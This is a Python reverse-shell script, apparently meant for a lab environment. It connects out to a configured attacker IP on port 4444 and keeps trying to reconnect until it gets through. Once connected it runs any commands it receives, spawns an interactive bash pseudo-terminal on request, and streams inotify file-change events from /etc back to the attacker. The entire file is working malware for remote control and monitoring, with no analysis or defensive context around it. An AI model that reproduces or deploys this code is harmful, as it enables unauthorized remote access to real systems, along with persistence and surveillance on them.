

import socket
import subprocess
import os
import time
import threading
import select
import pty

# ===== CONFIG =====
ATTACKER_IP = "10.176.246.85"   # <-- set to your Kali attacker IP
ATTACKER_PORT = 4444
RETRY_DELAY = 5                 # seconds between reconnect attempts
MONITOR_PATH = "/etc"           # directory to watch with inotifywait
# ==================

def monitor_inotify_loop(send_sock):
    """
    Background thread: runs inotifywait -m and forwards each event to the attacker
    prefixed with 'ALERT:'.
    Requires inotify-tools installed on the victim: sudo apt install inotify-tools
    """
    try:
        cmd = [
            "inotifywait", "-m", "-e", "create,modify,delete,move",
            "--format", "%w %e %f", MONITOR_PATH
        ]
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    except FileNotFoundError:
        # inotifywait not available -> inform attacker once and exit thread
        try:
            send_sock.sendall(b"ALERT: inotifywait not installed on victim\n")
        except Exception:
            pass
        return

    try:
        while True:
            line = p.stdout.readline()
            if line == "":
                # process ended
                break
            msg = f"ALERT: {line.strip()}\n"
            try:
                send_sock.sendall(msg.encode(errors="ignore"))
            except Exception:
                # sending failed (socket closed) -> stop thread
                break
    except Exception:
        pass
    finally:
        try:
            p.kill()
        except Exception:
            pass

def spawn_pty_session(sock):
    """
    Spawn a bash shell attached to a pseudo-tty and proxy I/O between the pty and the socket.
    This allows interactive programs to run remotely.
    Trigger by sending the command exactly: PTY
    """
    # fork a pty: in child we exec bash; parent proxies I/O
    pid, fd = pty.fork()
    if pid == 0:
        # Child: replace with shell
        try:
            os.execv("/bin/bash", ["/bin/bash"])
        except Exception:
            os._exit(1)
    else:
        # Parent: proxy between socket and pty fd
        try:
            sock.setblocking(False)
            while True:
                rlist, _, _ = select.select([sock, fd], [], [])
                if fd in rlist:
                    try:
                        data = os.read(fd, 4096)
                    except OSError:
                        break
                    if not data:
                        break
                    try:
                        sock.sendall(data)
                    except Exception:
                        break
                if sock in rlist:
                    try:
                        data = sock.recv(4096)
                    except Exception:
                        break
                    if not data:
                        break
                    try:
                        os.write(fd, data)
                    except Exception:
                        break
        except Exception:
            pass
        finally:
            # ensure child process dies if still running
            try:
                os.close(fd)
            except Exception:
                pass
            # return to caller; socket remains connected or may be closed
            return

def handle_connection(s):
    """
    Main command loop for an established connection `s`.
    Supports:
      - normal command execution (runs command with subprocess.getoutput and sends back output)
      - special command 'PTY' to spawn interactive shell
      - receives and ignores empty commands
    """
    # start the inotify monitor thread (daemon) for this connection
    monitor_thread = threading.Thread(target=monitor_inotify_loop, args=(s,), daemon=True)
    monitor_thread.start()

    # optional: change directory to root for predictable env
    try:
        os.chdir("/")
    except Exception:
        pass

    while True:
        try:
            # receive a command (blocking)
            data = s.recv(65536)
            if not data:
                # connection closed by attacker
                break
            cmd = data.decode(errors="ignore").strip()
        except Exception:
            break

        if cmd.lower() == "exit":
            # polite close
            break

        if cmd == "":
            # nothing to do
            continue

        if cmd == "PTY":
            # Start interactive pty session. This call will return when the PTY session ends.
            try:
                spawn_pty_session(s)
            except Exception:
                # if PTY failed, report back
                try:
                    s.sendall(b"ERROR: PTY spawn failed\n")
                except Exception:
                    pass
            # after PTY session returns, continue receiving normal commands
            continue

        # Normal (non-PTY) command execution
        try:
            output = subprocess.getoutput(cmd)
        except Exception as e:
            output = f"Command execution error: {e}"

        # Ensure we send something back (append newline for readability)
        try:
            s.sendall(output.encode(errors="ignore") + b"\n")
        except Exception:
            # send failed -> break to reconnect
            break

def connect_loop():
    """
    Connects to attacker, calls handle_connection on success, retries on failure.
    """
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            s.settimeout(None)  # blocking mode for the command loop
            handle_connection(s)
        except Exception:
            # connection failed or dropped; retry after delay
            time.sleep(RETRY_DELAY)
        finally:
            try:
                if s:
                    s.close()
            except Exception:
                pass

if __name__ == "__main__":
    connect_loop()
